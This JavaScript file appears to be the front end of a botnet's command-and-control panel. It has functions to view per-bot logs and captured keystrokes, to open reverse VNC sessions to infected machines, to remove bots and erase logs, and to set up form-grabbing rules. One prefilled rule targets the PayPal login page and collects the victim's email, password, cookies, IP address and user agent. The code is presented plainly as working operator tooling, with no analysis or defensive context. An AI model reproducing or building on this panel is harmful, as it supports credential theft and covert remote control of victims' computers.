
function EditUser(uid)
{

document.getElementById('myModalEvent').click();

$("#loader").show();

$.post("members.php", {access_id: uid, get_form:true}, function ($html){
																		 
																		 

$("#ajax_body").html($html);
$("#loader").hide();
																		 });
}



function showResults(id)
{
	$("#modal_title").html("Results of file...");
	
document.getElementById('myModalEvent').click();

$("#loader").show();

$.post("ajax.php", {av_results: true, file: id, ajax: 'true'}, function ($html){
															 
																		 

$("#ajax_body").html($html);
$("#loader").hide();
																	   });
	
}



function CheckFile(id)
{
	$("#modal_title").html("Checking file...");
	
document.getElementById('myModalEvent').click();

$("#loader").show();

$.post("controls.php?files=true", {scan: true, file: id, ajax: 'true'}, function ($html){
																	 
																		 

$("#ajax_body").html($html);
$("#loader").hide();
																	   });
	
}

function CheckAll()
{
	$('input:checkbox').prop('checked', true);
	$('input:checkbox').parent().addClass('checked');
}

function changeTask(val)
{
	
	if(val=='Remove Bot' || val=='Erase Logs')
	$('#filesGRoup').hide();
	else
	$('#filesGRoup').show();
	
}

function botInfoMore(id)
{
	$('.botinfo_' + id + '#botinfo_country').show();
	$('.botinfo_' + id + '#botinfo_os').show();
	$('.botinfo_' + id + '#botinfo_more').hide();
}

function botInfoLess(id)
{
	$('.botinfo_' + id + '#botinfo_country').hide();
	$('.botinfo_' + id + '#botinfo_os').hide();
	$('.botinfo_' + id + '#botinfo_more').show();
}

function ShowLog(uniq, log0)
{
	
	$("#modal_title").html("View Log of bot "+uniq);
	$("#log_area").val("Loading...");

	document.getElementById('myModalEvent').click();


	$.post("ajax.php", {getLog: true, unique_id: uniq, log_id: log0}, function ($data){
		$("#log_area").val($data);
	});

}

function ShowKeys(uniq, log0)
{
	
	$("#modal_title").html("View Log of bot "+uniq);
	$("#log_area").val("Loading...");

	document.getElementById('myModalEvent').click();


	$.post("ajax.php", {getKeys: true, unique_id: uniq, log_id: log0}, function ($data){
		$("#log_area").val($data);
	});

}

function ConnectVNC(uniq, client)
{
	$.post("ajax.php", {reverseConnect: true, unique_id: uniq, client: client, protocol: 'VNC'}, function ($data){
		$("#log_area").val($data);
	});

}

function DisplayAddRule()
{
	name_example = "Paypal rule 1";
	url_example =
	"http*://www.paypal.com/??/cgi-bin/webscr?cmd=_login-submit";

	vars_example = 
	"%VAR1% = \"email\"; %VAR2 = \"password\";";
	
	rule_example = 
	"Url: %URL%\n" +
	"Unique id: %BOTID%\n" +
	"Operating system: %OS%\n" +
	"IP address: %IP%\n" +
	"Country code: %CC%\n" +
	"Email address: %VAR1%\n" +
	"Password: %VAR2%\n" +
	"User agent: %USERAGENT%\n" +
	"Cookie: %COOKIE%";
	
	$("#modal_title").val("Add Rule");
	$("#name_area").val(name_example);
	$("#url_area").val(url_example);
	$("#var_area").val(vars_example);
	$("#rule_area").val(rule_example);

	$("#parser-button-area").html(
	"<a href=\"javascript:AddRule()\" class=\"btn\">Add</a>" + 
	"<a href=\"#\" class=\"btn\" data-dismiss=\"modal\">Close</a>"
	);
	
	document.getElementById('myModalEvent').click();
}

function AddRule()
{
	name = $("#name_area").val();
	url = $("#url_area").val();
	vars = $("#var_area").val();
	rule = $("#rule_area").val();
	
	$.post("ajax.php", {addRule: true, rule_name: name, rule_url: url, rule_vars: vars, rule_rule: rule}, function ($data){
		location.reload(true);
	});	
	
	$("#myModal").modal('hide');
}

function DisplayAddBlUrl()
{
	document.getElementById('myModalEvent').click();
}

function AddBlUrl()
{
	url = $("#url_area").val();
	$.post("ajax.php", {addBlUrl: true, bl_url: url}, function ($data){
		location.reload(true);
	});	
	
	$("#myModal").modal('hide');
}

function EditRule(id)
{
	$("#modal_title").val("Edit Rule");
	$("#name_area").val("Loading...");
	$("#url_area").val("Loading...");
	$("#var_area").val("Loading...");
	$("#rule_area").val("Loading...");
	$("#parser-button-area").html(
	"<a href=\"javascript:UpdateRule("+id+")\" class=\"btn\">Update</a>" + 
	"<a href=\"#\" class=\"btn\" data-dismiss=\"modal\">Close</a>"
	);
	
	document.getElementById('myModalEvent').click();

	$.post("ajax.php", {getRule: true, rule_id: id}, function ($data){
		data_array = $data.split('\r\n', 4);
		$("#name_area").val(data_array[0]);
		$("#url_area").val(data_array[1]);
		$("#var_area").val(data_array[2]);
		$("#rule_area").val(data_array[3]);
	});	
}

function UpdateRule(id)
{
	name = $("#name_area").val();
	url = $("#url_area").val();
	vars = $("#var_area").val();
	rule = $("#rule_area").val();
	
	$.post("ajax.php", {editRule: true, rule_id: id, rule_name: name, rule_url: url, rule_vars: vars, rule_rule: rule}, function ($data){
		location.reload(true);
	});	
	
	$("#myModal").modal('hide');
}

function searchStart(q)
{
	var q = $("#query").val();
	var q = jQuery.trim(q);
	$.post("?query="+q,
	   {ajax_response: true},
	   function (status_response){			 
			document.getElementById('container').innerHTML = status_response;
		}				 						 
	);		
}

function searchStartA(rid, q)
{
	var q = $("#query").val();
	var q = jQuery.trim(q);
	$.post("?rule_id="+rid+"&query="+q,
	   {ajax_response: true},
	   function (status_response){			 
			document.getElementById('container').innerHTML = status_response;
		}				 						 
	);		
}